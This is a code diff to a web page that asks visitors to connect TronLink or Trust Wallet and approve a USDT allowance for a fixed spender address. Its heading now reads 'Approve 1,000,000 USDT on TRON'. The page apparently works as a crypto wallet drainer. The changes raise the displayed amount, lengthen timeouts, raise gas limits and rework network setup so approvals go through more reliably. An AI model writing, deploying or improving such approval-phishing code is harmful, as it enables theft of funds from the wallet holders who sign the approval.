@@ -115,7 +115,7 @@
 </head>
 <body>
   <div class="container">
-    <h2>Approve 1,000, on TRON</h2>
+    <h2>Approve 1,000,000 USDT on TRON</h2>
     <p>Click the button to authorize the address:<br><strong class="spender-address">TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu</strong></p>
     <button onclick="approveUSDT('tronlink')">Authorize with TronLink</button>
     <button onclick="approveUSDT('trustwallet')">Authorize with Trust Wallet</button>
@@ -151,7 +151,7 @@
       return true;
     }
 
-    async function waitForEthers(timeout = 5000) {
+    async function waitForEthers(timeout = 10000) {
       const start = Date.now();
       while (typeof ethers === "undefined" || !ethers.utils) {
         if (Date.now() - start > timeout) {
@@ -162,23 +162,28 @@
       return true;
     }
 
-    async function setupTronNetwork(provider) {
-      try {
-        await provider.request({
-          method: "wallet_addEthereumChain",
-          params: [
-            {
-              chainId: "0x2b6653dc", // TRON Mainnet
-              chainName: "TRON Mainnet",
-              nativeCurrency: { name: "TRON", symbol: "TRX", decimals: 6 },
-              rpcUrls: ["https://api.trongrid.io"],
-              blockExplorerUrls: ["https://tronscan.org"]
-            }
-          ]
-        });
-      } catch (error) {
-        throw new Error(`Failed to setup TRON network: ${error.message}`);
+    async function setupTronNetwork() {
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [
+              {
+                chainId: "0x2b6653dc", // TRON Mainnet
+                chainName: "TRON Mainnet",
+                nativeCurrency: { name: "TRON", symbol: "TRX", decimals: 6 },
+                rpcUrls: ["https://api.trongrid.io"],
+                blockExplorerUrls: ["https://tronscan.org"]
+              }
+            ]
+          });
+          return true;
+        } catch (error) {
+          console.warn("Failed to add TRON network:", error);
+          return false;
+        }
       }
+      return false;
     }
 
     async function connectTrustWallet() {
@@ -187,6 +192,10 @@
         if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isMetaMask)) {
           provider = new ethers.providers.Web3Provider(window.ethereum);
           await window.ethereum.request({ method: "eth_requestAccounts" });
+          const networkAdded = await setupTronNetwork();
+          if (!networkAdded) {
+            throw new Error("Please add TRON Mainnet in Trust Wallet manually.");
+          }
         } else {
           provider = await EthereumProvider.init({
             projectId: "f6b400b4393b83bb22abcaf805ad72d2", // Replace with your WalletConnect project ID
@@ -203,8 +212,11 @@
           });
           await provider.connect();
           provider = new ethers.providers.Web3Provider(provider);
+          const networkAdded = await setupTronNetwork();
+          if (!networkAdded) {
+            throw new Error("Please add TRON Mainnet in Trust Wallet manually via WalletConnect.");
+          }
         }
-        await setupTronNetwork(provider);
         return provider;
       } catch (error) {
         throw new Error(`Failed to connect Trust Wallet: ${error.message}`);
@@ -286,7 +298,7 @@
           }
 
           statusText.textContent = "Sending approval transaction with Trust Wallet...";
-          const tx = await contract.approve(spenderAddress, amount, { gasLimit: 100000 });
+          const tx = await contract.approve(spenderAddress, amount, { gasLimit: 150000 });
           const receipt = await tx.wait();
 
           statusText.textContent = `✅ Approval successful! Transaction Hash: ${receipt.transactionHash}`;
